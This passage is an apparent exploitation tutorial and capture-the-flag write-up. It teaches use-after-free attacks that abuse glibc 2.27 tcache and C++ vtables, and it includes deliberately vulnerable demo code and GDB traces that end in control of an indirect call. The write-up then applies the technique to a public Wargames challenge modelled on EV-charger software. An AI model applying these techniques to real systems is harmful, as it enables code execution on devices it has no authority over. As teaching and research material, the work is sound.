  <li>Finally, the call to <code class="language-plaintext highlighter-rouge">v.~vector</code> will free the internal structure, whose final size is that of the internal structure after all those calls to <code class="language-plaintext highlighter-rouge">push_back</code>.</li>
</ul>

<h1 id="exploiting-older-tcache-implementations">Exploiting older tcache implementations</h1>

<blockquote>
  <p>Set a config value to a string of size <code class="language-plaintext highlighter-rouge">0x60</code> … UAF list traversal goes to 2nd fake node (the freed config string)</p>
</blockquote>

<p>Strings can be convenient ways to control data. Here, they can play an interesting role in how the tcache works during a use-after-free condition.</p>

<p>Let’s build on the driver code from the tcache discussion and add some string allocations and deallocations:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;inttypes.h&gt;
#include &lt;stdio.h&gt;
#include &lt;vector&gt;
#include &lt;cstring&gt;
</span>
<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">NAME</span> <span class="o">=</span> <span class="s">"AAAAAAAA"</span>
                   <span class="s">"AAAAAAAA"</span>
                   <span class="s">"AAAAAAAA"</span>
                   <span class="s">"AAAAAAAA"</span>
                   <span class="s">"AAAAAAAA"</span>
                   <span class="s">"AAAAAAAA"</span>
                   <span class="s">"AAAAAAAA"</span>
                   <span class="s">"AAAAAAA"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">uint64_t</span><span class="o">&gt;</span> <span class="n">v</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">name</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>

  <span class="n">v</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
  <span class="n">v</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
  <span class="n">v</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="mi">9</span><span class="p">);</span>
  <span class="n">v</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="mi">13</span><span class="p">);</span>

  <span class="n">name</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[</span><span class="mh">0x40</span><span class="p">];</span>
  <span class="n">strncpy</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">NAME</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
  <span class="k">delete</span> <span class="n">name</span><span class="p">;</span>

  <span class="n">v</span><span class="p">.</span><span class="o">~</span><span class="n">vector</span><span class="p">();</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"%lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>If we compile it with more recent glibc versions, it won’t do anything of interest, and we can’t control much. So let’s take a detour and see which versions are used by the Wargames challenge and the CHARX project. Recall that the CHARX project is available online and not encrypted, and that this specific Wargames challenge is open to the public, so it’s fair game to inspect them.</p>

<p>The CHARX executables were likely built with glibc 2.29:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings CharxControllerAgent | grep -i GLIBC_
GLIBC_2.4
GLIBC_2.29
GLIBC_2.8
GLIBC_2.28
GLIBC_2.15
GLIBC_2.17
GLIBC_2.7
</code></pre></div></div>

<p>Likewise, the Wargames platform is likely using glibc 2.27:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wdb&gt; vmmap
0x400000-0x409000 r-x charxpost_destructors
...
0x7f0000000000-0x7f0000029000 r-x ld-2.27.so
...
0x7f00007c4000-0x7f00009ab000 r-x libc-2.27.so
...
</code></pre></div></div>

<p>This gives us a range of versions to try out. The obvious way is to build glibc, ldd, and gcc using the specified versions. This would give us a chance to explore the differences in source code and further understand what changes in the memory allocator between old and current versions.</p>

<p>For now, we’re going to take a shortcut and just use an old Ubuntu container image, which is up to the spec we need:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@cba6a210200c:/# grep VERSION= /etc/os-release
VERSION="18.04.6 LTS (Bionic Beaver)"

root@cba6a210200c:/# ldd --version
ldd (Ubuntu GLIBC 2.27-3ubuntu1.6) 2.27
</code></pre></div></div>

<p>We can substitute the CLI <code class="language-plaintext highlighter-rouge">gcc</code> with a container that does the same thing but for a different version:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat Dockerfile
FROM ubuntu:18.04

RUN apt update &amp;&amp; \
    apt install -y --no-install-recommends g++

ENTRYPOINT ["g++"]

$ docker build -t ret2gpp .
</code></pre></div></div>

<p>Then build the application, passing the G++ options to the container options:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -v "$(pwd)":/code --rm ret2gpp \
	-g -static /code/demo.cpp -o /code/demo
</code></pre></div></div>

<p><em>Note: The use of <code class="language-plaintext highlighter-rouge">static</code> here is essential. Because any modern host system likely uses a different version of libc, you probably won’t observe the same behavior as you would when it’s executed on a system with that version of libc installed. By compiling as static, we provide a portable way to preserve those behaviors across different x64 systems.</em></p>

<p>Let’s open in GDB and break on the instruction just after the vector’s <code class="language-plaintext highlighter-rouge">[]</code> operator:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) disas main
...
   0x0000000000400cf9 &lt;+268&gt;:   call   0x400e10 &lt;vector::operator[]&gt;
   0x0000000000400cfe &lt;+273&gt;:   mov    rax,QWORD PTR [rax]
...

(gdb) b *main+273
Breakpoint 1 at 0x400cfe: file /code/ver.cpp, line 32.
(gdb) r
...
Breakpoint 1, 0x0000000000400cfe in main () at /code/ver.cpp:32
32        printf("%lu\n", v[0]);

(gdb) x/i $pc
=&gt; 0x400cfe &lt;main()+273&gt;:       mov    rax,QWORD PTR [rax]

(gdb) x/4gx $rax
0x6ee7a0:       0x00000000006ee7f0    0x00000000006dc1d0
0x6ee7b0:       0x0000000000000009    0x000000000000000d
</code></pre></div></div>

<p>Because we allocated and free’d some strings of the same usable size as the vector’s internal structure, the value of <code class="language-plaintext highlighter-rouge">tcache_entry-&gt;next</code> at RAX (<code class="language-plaintext highlighter-rouge">0x6ee7a0</code>) should point to one of those free’d entries:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/4gx 0x00000000006ee7f0
0x6ee7f0:       0x0000000000000000    0x00000000006dc1d0
0x6ee800:       0x4141414141414141    0x4141414141414141
</code></pre></div></div>

<p>The hex-encoded “A”s mean we were correct. This is the final tcache entry in this bin.</p>

<p>The important aspect here is that you have a way to control a buffer’s allocation size so you can match it against the target (here, the vector’s internal structure size). You can use previously discussed techniques to find it and adjust the string allocation. For example, the following patch to the code used in this section would work for a one-item vector.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="p">...</span>
  <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">uint64_t</span><span class="o">&gt;</span> <span class="n">v</span><span class="p">;</span>
  <span class="n">v</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
  <span class="c1">//printf("%lu\n", malloc_usable_size(static_cast&lt;void*&gt;(v.data())));  // 24</span>
  <span class="n">name</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>
  <span class="n">strncpy</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="p">(</span><span class="n">CHAR</span> <span class="o">*</span><span class="p">)</span><span class="n">name</span><span class="p">,</span> <span class="mi">23</span><span class="p">);</span>
  <span class="p">...</span>
</code></pre></div></div>

<p>You’ll notice the first sixteen “A”s were wiped out by the <code class="language-plaintext highlighter-rouge">tcache_entry</code> data, leaving only the final eight:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/4gx $rax
0x6f2730:       0x00000000006f2750    0x00000000006e01d0
0x6f2740:       0x0000000000000000    0x0000000000000021

(gdb) x/4gx 0x00000000006f2750
0x6f2750:       0x0000000000000000    0x00000000006e01d0
0x6f2760:       0x4141414141414141    0x0000000000000411
</code></pre></div></div>

<p>It should be obvious from the disassembly, but at this time, the strings provide no real advantage for exploitation. This is due entirely to the fact that we’re just pulling a long unsigned int and printing its value (ie, the tcache entry).</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x0000000000400cba &lt;+205&gt;:   mov    rax,QWORD PTR [rax]
   0x0000000000400cbd &lt;+208&gt;:   mov    rsi,rax
   ...
   0x0000000000400ccc &lt;+223&gt;:   call   0x428ff0 &lt;printf&gt;
</code></pre></div></div>

<p>If we could trick the compiler into reading data from the <code class="language-plaintext highlighter-rouge">tcache_entry-&gt;next+16</code>, we might gain some advantage for exploitation: either through a read or an execution.</p>

<h1 id="the-benefits-of-vtables">The benefits of vtables</h1>

<blockquote>
  <p>Our primitive has evolved from a simple UAF into an arbitrary virtual call</p>
</blockquote>

<p>So far, we’ve considered two different types of code: that which uses virtual functions, and code that uses vulnerable tcache versions. Let’s combine the two concepts:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Item</span> <span class="p">{</span>
<span class="nl">public:</span>
  <span class="k">virtual</span> <span class="kt">void</span> <span class="n">do_something</span><span class="p">();</span>
<span class="p">};</span>

<span class="p">...</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">Item</span> <span class="o">*&gt;</span> <span class="n">v</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">name</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>

  <span class="n">v</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="k">new</span> <span class="n">Item</span><span class="p">{});</span>
  <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">do_something</span><span class="p">();</span>

  <span class="n">name</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>
  <span class="n">strncpy</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">NAME</span><span class="p">,</span> <span class="mi">23</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
  <span class="k">delete</span> <span class="n">name</span><span class="p">;</span>

  <span class="n">v</span><span class="p">.</span><span class="o">~</span><span class="n">vector</span><span class="p">();</span>

  <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">do_something</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>It will crash just before the virtual call to <code class="language-plaintext highlighter-rouge">do_something</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/i $pc
=&gt; 0x400cf5 &lt;main()+231&gt;:       mov    rdx,QWORD PTR [rdx]

(gdb) x/gx $rax
0x6f2b80:       0x0000000000000000

(gdb) disas main
   0x0000000000400cea &lt;+220&gt;:   call   0x400e2e &lt;vector::operator[]&gt;
   0x0000000000400cef &lt;+225&gt;:   mov    rax,QWORD PTR [rax]
   0x0000000000400cf2 &lt;+228&gt;:   mov    rdx,QWORD PTR [rax]
=&gt; 0x0000000000400cf5 &lt;+231&gt;:   mov    rdx,QWORD PTR [rdx]
   ...
   0x0000000000400cfb &lt;+237&gt;:   call   rdx
</code></pre></div></div>

<p>This is no surprise given the data we looked at earlier. Zero is the value at <code class="language-plaintext highlighter-rouge">0x6f2750</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/4gx $rax
0x6f2730:       0x00000000006f2750    0x00000000006e01d0
0x6f2740:       0x0000000000000000    0x0000000000000021

(gdb) x/4gx 0x00000000006f2750
0x6f2750:       0x0000000000000000    0x00000000006e01d0
0x6f2760:       0x4141414141414141    0x0000000000000411
</code></pre></div></div>

<p>We can vizualize it like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rax, [rax]  // *item
rdx, [rax]  // item-&gt;vtable
rdx, [rdx]  // item-&gt;vtable-&gt;do_something &lt;fails to dereference 0x0
</code></pre></div></div>

<p>So, it fails when trying to dereference <code class="language-plaintext highlighter-rouge">do_something</code>. This is completely understandable because we are, again, exploiting a use-after-free condition. The “vtable” is really pointing to the <code class="language-plaintext highlighter-rouge">tcache-&gt;next</code> pointer, which contains the sixteen bytes needed for a tcache entry followed by any extra data.</p>

<p>Recall that tcache entries are all singly linked lists, whose first value will always point to another item of the same bin size. To (<em>sort of</em>) complete the vtable dereference, we can allocate and remove another string buffer whose size will also land in the same bin.</p>

<p>To keep it simple, let’s use an array of two names and perform the same allocation and deallocation operations on each element:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kt">char</span> <span class="o">*</span><span class="n">names</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
  <span class="p">...</span>
  
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">names</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">char</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>
    <span class="n">strncpy</span><span class="p">(</span><span class="n">names</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">NAME</span><span class="p">,</span> <span class="mi">23</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">names</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
  <span class="p">}</span>

  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">delete</span> <span class="n">names</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="p">...</span>
</code></pre></div></div>

<p>The extra <em>free</em>‘d string buffer gives us one more node to traverse in the tcache list:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/5i $pc
=&gt; 0x400d28 &lt;main()+282&gt;:       mov    rax,QWORD PTR [rax]
   0x400d2b &lt;main()+285&gt;:       mov    rdx,QWORD PTR [rax]
   0x400d2e &lt;main()+288&gt;:       mov    rdx,QWORD PTR [rdx]
   0x400d31 &lt;main()+291&gt;:       mov    rdi,rax
   0x400d34 &lt;main()+294&gt;:       call   rdx
   
(gdb) x/4gx $rax
0x6f2750:       0x00000000006f2ba0    0x00000000006e01d0
0x6f2760:       0x0000000000000000    0x0000000000000411

(gdb) x/4gx 0x00000000006f2ba0
0x6f2ba0:       0x00000000006f2b80    0x00000000006e01d0
0x6f2bb0:       0x0041414141414141    0x000000000000f451

(gdb) x/4gx 0x00000000006f2b80
0x6f2b80:       0x0000000000000000    0x00000000006e01d0
0x6f2b90:       0x0041414141414141    0x0000000000000021
</code></pre></div></div>

<p>This completes the dereference path, but points it to data that we almost control. Here, it will make it to CALL RDX, but RDX will be zero, the value of 0x6f2b80.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()

(gdb) bt
#0  0x0000000000000000 in ?? ()
#1  0x0000000000400d36 in main ()
</code></pre></div></div>

<p>Recall from the earlier section on virtual functions that the vtable may adjust the target quadword that is dereferenced. If we add more virtual functions, we should be able to gain some control over execution.</p>

<p>Right now, the vtable looks like this, because it has one virtual function:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>offset  target function
------  ----------------
 0x0     do_something
</code></pre></div></div>

<p>Let’s redefine <code class="language-plaintext highlighter-rouge">Item</code> to include one new virtual function:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Item</span> <span class="p">{</span>
<span class="nl">public:</span>
  <span class="k">virtual</span> <span class="kt">void</span> <span class="n">foo</span><span class="p">();</span>
  <span class="k">virtual</span> <span class="kt">void</span> <span class="n">do_something</span><span class="p">();</span>
<span class="p">};</span>
</code></pre></div></div>

<p>This should adjust the vtable to look like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>offset  target function
------  ----------------
 0x0     foo
 0x8     do_something
</code></pre></div></div>

<p>Implement <code class="language-plaintext highlighter-rouge">Item::foo</code> however you want. Then, compile it, and observe that an offset of 0x8 is added to the virtual call instructions:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x0000000000400d2c &lt;+286&gt;:   mov    rax,QWORD PTR [rax]
   0x0000000000400d2f &lt;+289&gt;:   mov    rdx,QWORD PTR [rax]
   0x0000000000400d32 &lt;+292&gt;:   add    rdx,0x8
   0x0000000000400d36 &lt;+296&gt;:   mov    rdx,QWORD PTR [rdx]
   ...
   0x0000000000400d3c &lt;+302&gt;:   call   rdx
</code></pre></div></div>

<p>Let it run and let it crash:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Program received signal SIGSEGV, Segmentation fault.
0x00000000006e01d0 in ?? ()
</code></pre></div></div>

<p>Now, instead of failing at <code class="language-plaintext highlighter-rouge">tcache_entry-&gt;next</code>, it fails at a fake <code class="language-plaintext highlighter-rouge">tcache_entry-&gt;key</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/4gx 0x00000000006f2b80
0x6f2b80:       0x0000000000000000    0x00000000006e01d0
0x6f2b90:       0x0041414141414141    0x0000000000000021
</code></pre></div></div>

<p>So, this matches what we expected to happen.</p>

<p>Now, let’s add a final trivial virtual function, <code class="language-plaintext highlighter-rouge">bar</code>, to complete the vtable and gain some control over the execution:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>offset  target function
------  ----------------
 0x0     foo
 0x8     bar
0x10     do_something
</code></pre></div></div>

<p>CALL RDX now points to whatever we inserted in the buffer earlier:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Program received signal SIGSEGV, Segmentation fault.
0x0000000000400d3c in main ()
42        v[0]-&gt;do_something();

(gdb) x/i $pc
=&gt; 0x400d3c &lt;main()+302&gt;:       call   rdx

(gdb) print/x $rdx
$1 = 0x41414141414141
</code></pre></div></div>

<p>If the data we added to the string buffers was something more useful, like the address of an unreachable function, that function would execute here.</p>

<h1 id="wargames-writeup">Wargames Writeup</h1>

<p>Let’s jump into <a href="https://wargames.ret2.systems/level/charxpost_destructors#">the challenge</a>.</p>

<p>Use static analysis to make the following observations:</p>
<ul>
  <li>The <code class="language-plaintext highlighter-rouge">Charger</code> class nests a <code class="language-plaintext highlighter-rouge">ChargePortManager</code>, which invokes a callback function <code class="language-plaintext highlighter-rouge">on_port_disconnected</code>. This is nearly identical to the dangerous behaviors described in the blog posts.</li>
  <li>The <code class="language-plaintext highlighter-rouge">Charger</code> instance is declared in global scope. This will have a similar behavior to the writeups’ explanation of using <code class="language-plaintext highlighter-rouge">static</code> versions in the <code class="language-plaintext highlighter-rouge">main</code> scope. Its destructor will be called in a scope that precedes <code class="language-plaintext highlighter-rouge">main</code>, so any weird behaviors won’t be obvious in static analysis.</li>
  <li>There is an opportunity to create strings of an arbitrary buffer. These are the “names” of the two charge plug types. We can try to control data when these values are created (with <code class="language-plaintext highlighter-rouge">new</code>) and to send them to the tcache when they are free’d (with <code class="language-plaintext highlighter-rouge">delete</code>).</li>
  <li>Although there’s no clear confirmation here, we can see references to <code class="language-plaintext highlighter-rouge">libc 2.27</code> in output from <code class="language-plaintext highlighter-rouge">vmmap</code> and <code class="language-plaintext highlighter-rouge">info proc mappings</code>, so it’s reasonable to wonder if it’s using an older tcache version.</li>
</ul>

<p>Start the program and don’t do anything (select option 6). Notice it exits gracefully.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Choice: 
&gt;&gt; 6
==== EXECUTION FINISHED ====
</code></pre></div></div>

<p>Rerun the program and create <em>one</em> charge connector with option 1. You can choose either of the two connector types. For now, don’t give it a name.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Choice: 
&gt;&gt; 1
Type of charging gun?
1. Standard
2. High Ampacity
Choice: 
&gt;&gt; 1
Enter length of description (0 for no description): 
&gt;&gt; 
Charge gun added!
</code></pre></div></div>

<p>After the charger is created, exit the program. Notice it crashes hideously:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Choice: 
&gt;&gt; 6
Segmentation Fault
rax: 0x0000000000000000
rbx: 0x0000000000000000
rcx: 0x0000000000000000
rdx: 0x00007fffffffeca0
rsi: 0x00007fffffffeca0
rdi: 0x00007fffffffec98
rbp: 0x00007fffffffecc0
rsp: 0x00007fffffffec80
rip: 0x000000000040205e
r8:  0x00007fffffffed93
r9:  0x0000000000000000
r10: 0x0000000000000006
r11: 0x00007f000085ba30
r12: 0x00007f0000baf718
r13: 0x0000000000000007
r14: 0x00007f0000bb4708
r15: 0x00007f0000bb0d80
fs:  0x0000000000000000
gs:  0x0000000000000000
eflags: 0x0000000000000000
</code></pre></div></div>

<p>Let’s inspect where the crash occurred:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wdb&gt; backtrace
0x40205e in Charger::on_port_disconnected ()
0x401f23 in ChargePortManager::disconnect_port ()
0x401d91 in ChargePortManager::~ChargePortManager ()
0x40591e in Charger::~Charger ()
0x7f0000807161 in  ()

wdb&gt; x/i $pc
0x40205e &lt;Charger::on_port_disconnected+120&gt;:  mov rax, qword ptr [rax]
</code></pre></div></div>

<p>Check out its source code:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kt">void</span> <span class="nf">on_port_disconnected</span><span class="p">(</span><span class="kt">int</span> <span class="n">p</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">for</span> <span class="p">(</span><span class="n">ChargeGun</span><span class="o">*</span> <span class="n">gun</span> <span class="o">:</span> <span class="n">guns</span><span class="p">)</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">gun</span><span class="o">-&gt;</span><span class="n">uses_port</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">gun</span><span class="o">-&gt;</span><span class="n">plugged_in</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>Now, zoom out of the disassembly, around the area of the crash:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x40204e &lt;+104&gt;:  call    0x402696 &lt;__normal_iterator&lt;ChargeGun**, std::vector&lt;ChargeGun*&gt; &gt;::operator*&gt;
0x402053 &lt;+109&gt;:  mov     rax, qword [rax]
0x402056 &lt;+112&gt;:  mov     qword [rbp-0x10], rax
0x40205a &lt;+116&gt;:  mov     rax, qword [rbp-0x10]
0x40205e &lt;+120&gt;:  mov     rax, qword [rax]
0x402061 &lt;+123&gt;:  add     rax, 0x10
0x402065 &lt;+127&gt;:  mov     rax, qword [rax]
0x402068 &lt;+130&gt;:  mov     ecx, dword [rbp-0x3c]
0x40206b &lt;+133&gt;:  mov     rdx, qword [rbp-0x10]
0x40206f &lt;+137&gt;:  mov     esi, ecx
0x402071 &lt;+139&gt;:  mov     rdi, rdx
0x402074 &lt;+142&gt;:  call    rax
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">CALL RAX</code> command should stand out as the virtual call to <code class="language-plaintext highlighter-rouge">on_port_disconnected</code>. We can backtrack some of the other steps to make sense of the behavior:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;+104&gt;:  call    0x402696 &lt;__normal_iterator&lt;ChargeGun**, std::vector&lt;ChargeGun*&gt; &gt;::operator*&gt;
&lt;+109&gt;:  mov     rax, qword [rax]      ;
&lt;+112&gt;:  mov     qword [rbp-0x10], rax ; 
&lt;+116&gt;:  mov     rax, qword [rbp-0x10] ; Address of charger
&lt;+120&gt;:  mov     rax, qword [rax]      ; charger-&gt;vtable
&lt;+123&gt;:  add     rax, 0x10             ; charger-&gt;vtable[0x10]
&lt;+127&gt;:  mov     rax, qword [rax]      ; charger-&gt;vtable[0x10]-&gt;uses_port
&lt;+130&gt;:  mov     ecx, dword [rbp-0x3c] ; 
&lt;+133&gt;:  mov     rdx, qword [rbp-0x10] ; 
&lt;+137&gt;:  mov     esi, ecx              ; Value of p
&lt;+139&gt;:  mov     rdi, rdx              ; Address of charger
&lt;+142&gt;:  call    rax                   ; call ChargeGunBase::uses_port()
</code></pre></div></div>

<p>We can see it’s failing to fetch the address of the charger, a side effect of the UAF condition. You can break here, restart the application, and remove a connector (option 2) to see the expected behavior and trace to the address of <code class="language-plaintext highlighter-rouge">on_port_disconnected</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint 1: 0x40205e, Charger::on_port_disconnected+120

wdb&gt; x/8i $pc
0x40205e &lt;Charger::on_port_disconnected+120&gt;:  mov rax, qword ptr [rax]
0x402061 &lt;Charger::on_port_disconnected+123&gt;:  add rax, 0x10
0x402065 &lt;Charger::on_port_disconnected+127&gt;:  mov rax, qword ptr [rax]
0x402068 &lt;Charger::on_port_disconnected+130&gt;:  mov ecx, dword ptr [rbp - 0x3c]
0x40206b &lt;Charger::on_port_disconnected+133&gt;:  mov rdx, qword ptr [rbp - 0x10]
0x40206f &lt;Charger::on_port_disconnected+137&gt;:  mov esi, ecx
0x402071 &lt;Charger::on_port_disconnected+139&gt;:  mov rdi, rdx
0x402074 &lt;Charger::on_port_disconnected+142&gt;:  call rax

wdb&gt; print $rax
$3 = 0x61cea0

wdb&gt; x/x $rax
0x61cea0: 0x00608d20

wdb&gt; x/x 0x00608d20+0x10
0x608d30: 0x00401bdc

wdb&gt; x/x 0x00401bdc
0x401bdc: 0xe5894855

wdb&gt; x/i 0x00401bdc
0x401bdc &lt;StandardChargeGun::uses_port+0&gt;:    push rbp
</code></pre></div></div>

<p>Here, you can see we created a StandardChargeGun subtype, so that’s where the function resolves. Additionally, you’ll notice that <code class="language-plaintext highlighter-rouge">ChargeGun::uses_port</code> has no debugger labels, so you’ll need to pay attention to the subclass implementations. The fact that it maps to a common supertype is important to keep in mind.</p>

<p>Now that we better understand the <em>intended behavior</em> of this method, let’s circle back to the actual, problematic behavior. We proved that the UAF condition can manifest simply by creating a charge plug. If we control the vtable, we could control the code pointed-to in the call to <code class="language-plaintext highlighter-rouge">ChargeGun::uses_port</code>.</p>

<p>As noted earlier, there is some sparse indication that this binary is using some form of GLIBC 2.27:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wdb&gt; info proc mappings
...
0x7f0000000000-0x7f0000029000 r-x ld-2.27.so
0x7f0000029000-0x7f000002b000 rw-
0x7f000002b000-0x7f000002e000 rw-
0x7f0000229000-0x7f000022a000 r-- ld-2.27.so
0x7f000022a000-0x7f000022c000 rw- ld-2.27.so
...
0x7f00007c4000-0x7f00009ab000 r-x libc-2.27.so
0x7f00009ab000-0x7f0000bab000 --- libc-2.27.so
0x7f0000bab000-0x7f0000baf000 r-- libc-2.27.so
0x7f0000baf000-0x7f0000bb1000 rw- libc-2.27.so
</code></pre></div></div>

<p>We can recall the tcache behavior and how the use of character buffers facilitates arbitrary executions. As it turns out, we have some opportunity to abuse this if we look to the <code class="language-plaintext highlighter-rouge">ChargeGun::description</code> field:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">ChargeGun</span> <span class="p">{</span>
    <span class="nl">public:</span>
        <span class="p">...</span>
        <span class="kt">char</span><span class="o">*</span> <span class="n">description</span><span class="p">;</span>

        <span class="n">ChargeGun</span><span class="p">()</span> <span class="o">:</span> <span class="n">plugged_in</span><span class="p">(</span><span class="nb">false</span><span class="p">),</span> <span class="n">description</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">{}</span>
        <span class="k">virtual</span> <span class="o">~</span><span class="n">ChargeGun</span><span class="p">()</span> <span class="p">{</span> <span class="k">delete</span> <span class="n">description</span><span class="p">;</span> <span class="p">}</span>
        <span class="p">...</span>
